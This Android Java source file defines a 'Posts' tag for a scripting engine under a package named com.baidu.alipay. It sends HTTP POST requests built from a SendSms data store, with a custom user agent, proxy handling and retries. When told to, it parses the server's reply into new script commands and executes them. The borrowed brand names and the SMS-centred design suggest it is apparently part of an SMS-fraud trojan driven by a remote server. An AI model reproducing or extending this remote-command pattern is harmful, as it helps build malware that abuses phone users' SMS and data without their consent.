package com.baidu.alipay.script;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.content.Context;
import android.util.Log;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.net.HttpConnect;

/**
 * <posts>
 * 	<url>**</url>
 * 	<back>**</back>
 * 	<params>***</params>
 * </posts>
 * @author leoliu
 *
 */
public class Posts extends Tags {
    private static final String TAG = "Posts";
    
    public static final String PROP_URL = "url";
    public static final String PROP_BACK = "back";
    public static final String PROP_PARAMS = "params";
    public static final String PROP_PROXY = "proxy";
    public static final String PROP_PARSE = "parse";
    public static final String PROP_ISDOMAIN = "isDomain";
    
    private String url;
    private String data;
    private String back;
    private String proxy;
    private String parse;
    private boolean isDomain = true;
    
    private static int maxTryTimes = 3;

    public Posts(String post,boolean dynamic) {
        this.url = getNodeValue(post, PROP_URL);
        this.back = getNodeValue(post, PROP_BACK);
        this.data = getNodeValue(post, PROP_PARAMS);
        this.setHeader = getNodeValue(post, PROP_SETHEADER);
        this.proxy = getNodeValue(post, PROP_PROXY);
        this.proxy = (this.proxy == "" ? "1" : "0");
        this.parse = getNodeValue(post, PROP_PARSE);
        String isDomainStr = getNodeValue(post, PROP_ISDOMAIN);
        if(isDomainStr!= null && isDomainStr.length() > 0){
        	this.isDomain = Boolean.parseBoolean(isDomainStr);
        }
        this.dynamic = dynamic;
    }
    
    public String work(Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
        
        String Url_ = formatUrl(sendSms,url);
        
        String Data_ = repParams(sendSms, data);
        
        Data_ = fomartData(sendSms,Data_);
        
        String SetHeader_ = null;
        if (setHeader != null) {
            SetHeader_ = fomartData(sendSms,setHeader);
        }
        
        int tryTimes = 0;
        
        while(tryTimes < maxTryTimes && rStr == null){
        	try {
        		if(tryTimes > 0){
        			Thread.sleep(1000 * 2);
        		}
        		
            	HttpConnect conn = new HttpConnect(context);
                conn.isProxy = (proxy == "1");
                
//                LogUtil.e(TAG, "post 方法第"+tryTimes+"次访问" + Url_);
//                LogUtil.e(TAG, "post UA~~" + sendSms.getUa());
//                LogUtil.e(TAG, "post data~~" + Data_);
               
                byte[] BackStream = conn.request(sendSms,Url_, "POSTS", referer, sendSms.getUa(), Data_,
                        SetHeader_, 0, isDomain);
                if (BackStream == null) {
//                    LogUtil.e(TAG, "POST方法400错误" + back + "");
                    errorReason = "P_400_" + back;
                }else{
                	rStr = com.baidu.alipay.Tools.byteToUTF8String(BackStream);
                    Log.e(TAG, rStr);
                }
                
                conn = null;
                BackStream = null;
                System.gc();
            } catch (Exception ex) {
                ex.printStackTrace();
                
                errorReason = "P1_" + back + "_" + ex.getClass().getName();
            }
        	
        	tryTimes ++;
        	
        }
        
        if(rStr == null){
        	return TAGS_EXEC_FAIL;
        }else{
//        	LogUtil.e(TAG, "pma~~~~" + rStr);
        	
        	if("1".equals(parse)){
        		List<Tags> subList = parse(rStr,true);
            	
        		if(subList != null && subList.size() > 0){
            		boolean succ = true;
            		
//            		try{
//    	        		for(int i = 0 ; i < subList.size() ; i ++){
//    	        			Tags tags = subList.get(i);
//    	        			
//    	        			String ret = tags.work(context, sendSms, subList, i);
//    	        			
//    	        			if(TAGS_EXEC_FAIL.equals(ret)){
//    	        				succ = false;
//    	        				errorReason = "P1_"+tags.getErrorReason()+"_"+i;
//    	        				break;
//    	        			}
//    	        		}
//            		}catch (Exception e) {
//    					e.printStackTrace();
//    					succ = false;
//    					errorReason = "P1_"+e.getClass().getName();
//    				}
            		succ = execSubList(context, sendSms, tagsList, pos, subList);
            		
            		if(!succ){
            			return TAGS_EXEC_FAIL;
            		}
            	}
        	}else if (back != null && !back.equals("")) {
//            	rStr = "POST:" + Url_ + "\r\n" + rStr;
                sendSms.setDataValue(back, rStr);
            }
        	
        	rStr = null;
        	errorReason = "";
        	return TAGS_EXEC_SUCC;
        }
    }
    
    private String repParams(SendSms sendSms,String params){
		
		if(params != null && params.length() > 0){
			String prefix = "{";
			String postfix = "}";
			
			int startPos = params.indexOf(prefix);
			int endPos = params.indexOf(postfix);
			
			while(startPos >= 0 && endPos > startPos){
				String key = params.substring(startPos+1,endPos);
				
				String value = sendSms.getDataValue(key);
				
				params = params.replace("{"+key+"}", value);
				
				startPos = params.indexOf(prefix);
				endPos = params.indexOf(postfix);
			}
		}
		
		return params;
	}

	@Override
	public String getTag() {
		return TAGS_POSTS;
	}
}